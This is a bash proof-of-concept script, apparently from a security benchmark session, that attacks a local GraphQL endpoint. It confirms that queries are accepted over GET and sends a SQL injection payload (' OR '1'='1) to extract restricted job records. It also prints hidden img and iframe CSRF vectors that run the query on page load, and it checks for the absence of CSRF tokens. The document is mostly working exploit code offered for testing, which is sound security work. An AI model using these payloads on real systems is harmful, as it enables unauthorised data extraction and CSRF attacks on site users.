#!/bin/bash
# POC: Demonstrates CSRF vulnerability in GraphQL endpoint via GET request support. Shows that the GraphQL endpoint accepts and processes queries via GET parameters, enabling CSRF attacks.
# Target: ./repo
# Created: 2025-11-10T15:10:57.643Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# CSRF via GET Request to GraphQL Endpoint - POC
# This script demonstrates that the GraphQL endpoint accepts GET requests,
# which enables CSRF attacks by crafting URLs that execute queries

TARGET="http://localhost:8000"
GRAPHQL_ENDPOINT="${TARGET}/graphql/"

echo "=== GraphQL CSRF via GET Request POC ==="
echo "Target: $TARGET"
echo ""

# Test 1: Normal GraphQL query via GET
echo "[+] Test 1: Normal GraphQL Query via GET"
echo "Description: Testing if GET requests are supported for GraphQL queries"
echo ""

# URL-encoded query: { jobs(jobType: "") { id name type description } }
QUERY1='{ jobs(jobType: "") { id name type description } }'
ENCODED_QUERY1=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$QUERY1'))")

echo "Query: $QUERY1"
echo "Encoded: $ENCODED_QUERY1"
echo ""

RESPONSE1=$(curl -s "${GRAPHQL_ENDPOINT}?query=${ENCODED_QUERY1}")
echo "Response Status: 200 (if successful)"
echo "Response Body (first 500 chars):"
echo "$RESPONSE1" | head -c 500
echo ""
echo ""

# Check if GET request was successful
if echo "$RESPONSE1" | grep -q "id\|name\|type"; then
    echo "[✓] GET requests are SUPPORTED - CSRF vulnerability confirmed!"
    echo ""
else
    echo "[!] Unexpected response"
    echo "Full response: $RESPONSE1"
    exit 1
fi

# Test 2: SQL Injection via GET (demonstrating CSRF + SQLi combination)
echo "[+] Test 2: SQL Injection via GET (CSRF + SQLi)"
echo "Description: Demonstrating an attacker can craft a URL that exploits both CSRF and SQL injection"
echo ""

# URL-encoded query with SQL injection: { jobs(jobType: "' OR '1'='1") { id name type description } }
QUERY2="{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"
ENCODED_QUERY2=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$QUERY2\"))")

echo "Query: $QUERY2"
echo "Encoded: $ENCODED_QUERY2"
echo ""

RESPONSE2=$(curl -s "${GRAPHQL_ENDPOINT}?query=${ENCODED_QUERY2}")
echo "Response (first 500 chars):"
echo "$RESPONSE2" | head -c 500
echo ""
echo ""

# Check if restricted data is returned
if echo "$RESPONSE2" | grep -q "restricted\|Internal"; then
    echo "[✓] SQL Injection via GET successful - Can extract restricted data!"
    echo "[✓] CSRF vulnerability confirmed - An attacker can craft a URL containing this query"
    echo "[✓] Combined CSRF+SQLi Attack: Attacker sends victim a link with malicious GraphQL query"
    echo ""
else
    echo "[!] Response does not show restricted data"
fi

# Test 3: Demonstrate CSRF attack vector (image tag, iframe, etc.)
echo "[+] Test 3: CSRF Attack Vector Simulation"
echo "Description: Showing how an attacker could trigger this via image tag or iframe"
echo ""

# Create a URL that could be embedded in an image tag
CSRF_URL="${GRAPHQL_ENDPOINT}?query=${ENCODED_QUERY1}"
echo "Attack Vector 1 - Image Tag (auto-executes on page load):"
echo "<img src='${CSRF_URL}' style='display:none;' />"
echo ""

echo "Attack Vector 2 - Iframe (auto-loads page):"
echo "<iframe src='${CSRF_URL}' style='display:none;'></iframe>"
echo ""

echo "Attack Vector 3 - Direct Link (user clicks to trigger):"
echo "${CSRF_URL}"
echo ""

# Test 4: Verify GET requests are processed without CSRF tokens
echo "[+] Test 4: Verify No CSRF Protection"
echo "Description: Checking if CSRF tokens or protections are enforced"
echo ""

# Make a GET request and check response headers for CSRF tokens or protections
HEADERS=$(curl -s -i "${GRAPHQL_ENDPOINT}?query=${ENCODED_QUERY1}" 2>&1)
echo "Checking response headers for CSRF protections..."
echo ""

if echo "$HEADERS" | grep -qi "csrf\|x-csrf\|token"; then
    echo "[!] CSRF-related headers detected"
    echo "$HEADERS" | grep -i "csrf\|token"
else
    echo "[✓] No CSRF tokens or protections detected in response"
fi

echo ""
echo "[✓] CSRF via GET Request - Vulnerability Confirmed"
echo "    - GraphQL endpoint accepts GET requests"
echo "    - Queries can be executed without POST method"
echo "    - No CSRF tokens or protections observed"
echo "    - URLs can be crafted to exploit SQL injection via CSRF"
echo ""